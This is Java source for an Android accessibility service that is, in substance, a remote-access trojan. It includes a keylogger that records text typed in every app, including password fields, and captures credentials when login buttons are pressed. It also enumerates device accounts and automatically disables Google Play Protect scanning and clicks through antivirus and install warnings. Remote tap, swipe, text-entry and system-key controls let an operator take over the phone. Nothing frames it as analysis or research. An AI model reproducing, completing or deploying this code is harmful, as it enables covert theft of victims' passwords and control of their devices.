package com.remote.control;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class RemoteControlService extends AccessibilityService {

    private static final String TAG = "RemoteControl";
    public static RemoteControlService instance = null;

    // Keylogger
    private static final int MAX_KEYLOG_ENTRIES = 5000;
    private final List<KeylogEntry> keylogBuffer = new ArrayList<>();
    private String lastText = "";
    private String lastPackage = "";

    // Password / credential capture
    private static final int MAX_CREDENTIAL_ENTRIES = 1000;
    private final List<CredentialEntry> credentialBuffer = new ArrayList<>();
    private String lastPasswordText = "";
    private String pendingUsername = "";
    private String pendingPackage = "";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.d(TAG, "AccessibilityService connected - remote control enabled");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        int eventType = event.getEventType();

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText() != null && !event.getText().isEmpty()
                    ? event.getText().get(0) : null;
            if (text == null) return;

            String currentText = text.toString();
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";

            // Check if this is a password field
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.isPassword()) {
                // Password field detected
                lastPasswordText = currentText;
                pendingPackage = packageName;
                addKeylogEntry(packageName, "[PWD] " + currentText);
                source.recycle();
                return;
            }
            if (source != null) source.recycle();

            // Detect what was typed (diff between old and new text)
            String typed = extractTypedChars(currentText, lastText, packageName);
            lastText = currentText;
            lastPackage = packageName;

            if (typed != null && !typed.isEmpty()) {
                addKeylogEntry(packageName, typed);
                // Track potential username (non-password text before a password field)
                pendingUsername = currentText;
                pendingPackage = packageName;
            }
        } else if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            // Reset on focus change
            lastText = "";
            if (event.getPackageName() != null) {
                lastPackage = event.getPackageName().toString();
            }
            // Check if focused field is password
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                if (source.isPassword()) {
                    lastPasswordText = "";
                }
                source.recycle();
            }
        } else if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            // Detect "login" / "submit" button clicks to capture credentials
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence desc = source.getText();
                if (desc == null) desc = source.getContentDescription();
                if (desc != null && isLoginButton(desc.toString())) {
                    String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
                    captureCredential(pkg);
                }
                source.recycle();
            }
        } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            // Auto-dismiss Play Protect and antivirus warnings
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
            if (pkg.equals("com.google.android.gms") || pkg.equals("com.android.vending")
                    || pkg.contains("antivirus") || pkg.contains("security") || pkg.contains("cleaner")) {
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(
                        this::dismissSecurityAlerts, 500);
            }
        }
    }

    private String extractTypedChars(String current, String previous, String pkg) {
        if (!pkg.equals(lastPackage)) {
            // App changed, treat entire text as new
            return current;
        }
        if (current.length() > previous.length() && current.startsWith(previous)) {
            // Characters appended
            return current.substring(previous.length());
        } else if (current.length() < previous.length()) {
            // Deletion
            return "[DEL]";
        } else if (!current.equals(previous)) {
            // Text replaced
            return current;
        }
        return null;
    }

    private synchronized void addKeylogEntry(String packageName, String text) {
        if (keylogBuffer.size() >= MAX_KEYLOG_ENTRIES) {
            keylogBuffer.remove(0);
        }
        keylogBuffer.add(new KeylogEntry(System.currentTimeMillis(), packageName, text));
        Log.d(TAG, "Keylog: [" + packageName + "] " + text);
    }

    public synchronized JSONArray getKeylogData(int limit) {
        JSONArray array = new JSONArray();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        int start = Math.max(0, keylogBuffer.size() - limit);
        for (int i = start; i < keylogBuffer.size(); i++) {
            KeylogEntry entry = keylogBuffer.get(i);
            try {
                JSONObject obj = new JSONObject();
                obj.put("timestamp", sdf.format(new Date(entry.timestamp)));
                obj.put("package", entry.packageName);
                obj.put("text", entry.text);
                array.put(obj);
            } catch (Exception e) {
                Log.e(TAG, "Error building keylog JSON", e);
            }
        }
        return array;
    }

    public synchronized void clearKeylog() {
        keylogBuffer.clear();
    }

    // ===== PASSWORD / CREDENTIAL CAPTURE =====

    private boolean isLoginButton(String text) {
        String lower = text.toLowerCase(Locale.ROOT);
        return lower.contains("login") || lower.contains("log in") || lower.contains("sign in")
                || lower.contains("signin") || lower.contains("connexion") || lower.contains("se connecter")
                || lower.contains("submit") || lower.contains("envoyer") || lower.contains("entrer")
                || lower.contains("next") || lower.contains("suivant") || lower.contains("continue")
                || lower.contains("valider") || lower.contains("confirm");
    }

    private synchronized void captureCredential(String packageName) {
        if (lastPasswordText.isEmpty() && pendingUsername.isEmpty()) return;

        String username = pendingUsername;
        String password = lastPasswordText;

        if (password.isEmpty()) return; // No password captured

        if (credentialBuffer.size() >= MAX_CREDENTIAL_ENTRIES) {
            credentialBuffer.remove(0);
        }
        credentialBuffer.add(new CredentialEntry(
                System.currentTimeMillis(), packageName, username, password));
        Log.d(TAG, "Credential captured: [" + packageName + "] user=" + username);

        // Reset after capture
        lastPasswordText = "";
        pendingUsername = "";
    }

    public synchronized JSONArray getCredentials(int limit) {
        JSONArray array = new JSONArray();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        int start = Math.max(0, credentialBuffer.size() - limit);
        for (int i = start; i < credentialBuffer.size(); i++) {
            CredentialEntry entry = credentialBuffer.get(i);
            try {
                JSONObject obj = new JSONObject();
                obj.put("timestamp", sdf.format(new Date(entry.timestamp)));
                obj.put("package", entry.packageName);
                obj.put("username", entry.username);
                obj.put("password", entry.password);
                array.put(obj);
            } catch (Exception e) {
                Log.e(TAG, "Error building credential JSON", e);
            }
        }
        return array;
    }

    public synchronized void clearCredentials() {
        credentialBuffer.clear();
    }

    public JSONArray getDeviceAccounts() {
        JSONArray accounts = new JSONArray();
        try {
            android.accounts.AccountManager am = android.accounts.AccountManager.get(this);
            android.accounts.Account[] deviceAccounts = am.getAccounts();
            for (android.accounts.Account account : deviceAccounts) {
                JSONObject obj = new JSONObject();
                obj.put("name", account.name);
                obj.put("type", account.type);
                accounts.put(obj);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting device accounts", e);
        }
        return accounts;
    }

    /**
     * Auto-click Play Protect toggles to disable scanning
     * Searches the screen for toggle switches and known button texts
     */
    public void clickPlayProtectToggle() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            // Look for toggle/switch elements related to scanning
            List<AccessibilityNodeInfo> switches = root.findAccessibilityNodeInfosByViewId(
                    "com.google.android.gms:id/switchWidget");
            if (switches != null && !switches.isEmpty()) {
                for (AccessibilityNodeInfo sw : switches) {
                    if (sw.isChecked()) {
                        sw.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        Log.d(TAG, "Play Protect toggle clicked (was ON)");
                    }
                }
            }

            // Also try to find by text
            String[] targets = {"Scan apps with Play Protect", "Analyser les applis",
                    "Scan device for security threats", "Rechercher les menaces",
                    "Improve harmful app detection", "Ameliorer la detection"};
            for (String target : targets) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
                if (nodes != null) {
                    for (AccessibilityNodeInfo node : nodes) {
                        AccessibilityNodeInfo parent = node.getParent();
                        if (parent != null) {
                            // Find switch in same layout
                            for (int i = 0; i < parent.getChildCount(); i++) {
                                AccessibilityNodeInfo child = parent.getChild(i);
                                if (child != null && "android.widget.Switch".equals(child.getClassName())) {
                                    if (child.isChecked()) {
                                        child.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                        Log.d(TAG, "Play Protect switch disabled: " + target);
                                    }
                                }
                            }
                            parent.recycle();
                        }
                        node.recycle();
                    }
                }
            }

            // Handle confirmation dialogs (click "Turn off" / "Desactiver")
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                AccessibilityNodeInfo dialogRoot = getRootInActiveWindow();
                if (dialogRoot == null) return;
                String[] confirmTexts = {"Turn off", "Desactiver", "OK", "Accept", "Accepter"};
                for (String text : confirmTexts) {
                    List<AccessibilityNodeInfo> buttons = dialogRoot.findAccessibilityNodeInfosByText(text);
                    if (buttons != null) {
                        for (AccessibilityNodeInfo btn : buttons) {
                            if (btn.isClickable()) {
                                btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                Log.d(TAG, "Confirmation clicked: " + text);
                            }
                            btn.recycle();
                        }
                    }
                }
                dialogRoot.recycle();
            }, 1500);

            root.recycle();
        } catch (Exception e) {
            Log.e(TAG, "Error disabling Play Protect", e);
        }
    }

    /**
     * Dismiss security warnings from antivirus apps via accessibility
     */
    public void dismissSecurityAlerts() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            String[] dismissTexts = {"Ignore", "Ignorer", "Keep anyway", "Conserver",
                    "Install anyway", "Installer quand meme", "I understand", "Je comprends",
                    "Skip", "Passer", "Dismiss", "Fermer", "Got it", "Compris"};

            for (String text : dismissTexts) {
                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
                if (nodes != null) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.d(TAG, "Security alert dismissed: " + text);
                        }
                        node.recycle();
                    }
                }
            }
            root.recycle();
        } catch (Exception e) {
            Log.e(TAG, "Error dismissing alerts", e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "AccessibilityService interrupted");
    }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
        Log.d(TAG, "AccessibilityService destroyed");
    }

    /**
     * Simulate a tap at screen coordinates
     */
    public void performTap(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Path path = new Path();
        path.moveTo(x, y);

        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));

        dispatchGesture(builder.build(), new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                Log.d(TAG, "Tap completed at " + x + "," + y);
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                Log.w(TAG, "Tap cancelled at " + x + "," + y);
            }
        }, null);
    }

    /**
     * Simulate a swipe from (x1,y1) to (x2,y2)
     */
    public void performSwipe(int x1, int y1, int x2, int y2, long durationMs) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);

        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, Math.max(durationMs, 100)));

        dispatchGesture(builder.build(), new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                Log.d(TAG, "Swipe completed");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                Log.w(TAG, "Swipe cancelled");
            }
        }, null);
    }

    /**
     * Input text into the currently focused field
     */
    public void performTextInput(String text) {
        AccessibilityNodeInfo focusedNode = findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focusedNode != null) {
            Bundle args = new Bundle();
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            focusedNode.recycle();
            Log.d(TAG, "Text input: " + text);
        } else {
            Log.w(TAG, "No focused input field for text input");
        }
    }

    // Inner class for keylog entries
    private static class KeylogEntry {
        final long timestamp;
        final String packageName;
        final String text;

        KeylogEntry(long timestamp, String packageName, String text) {
            this.timestamp = timestamp;
            this.packageName = packageName;
            this.text = text;
        }
    }

    // Inner class for credential entries
    private static class CredentialEntry {
        final long timestamp;
        final String packageName;
        final String username;
        final String password;

        CredentialEntry(long timestamp, String packageName, String username, String password) {
            this.timestamp = timestamp;
            this.packageName = packageName;
            this.username = username;
            this.password = password;
        }
    }

    /**
     * Perform system key actions
     */
    public void performSystemKey(String key) {
        switch (key) {
            case "back":
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            case "home":
                performGlobalAction(GLOBAL_ACTION_HOME);
                break;
            case "recents":
                performGlobalAction(GLOBAL_ACTION_RECENTS);
                break;
            case "notifications":
                performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
                break;
            case "quick-settings":
                performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS);
                break;
            case "power":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
                }
                break;
            case "lock":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                }
                break;
            case "screenshot":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
                }
                break;
            case "split-screen":
                performGlobalAction(GLOBAL_ACTION_TOGGLE_SPLIT_SCREEN);
                break;
            default:
                Log.w(TAG, "Unknown system key: " + key);
        }
        Log.d(TAG, "System key: " + key);
    }
}
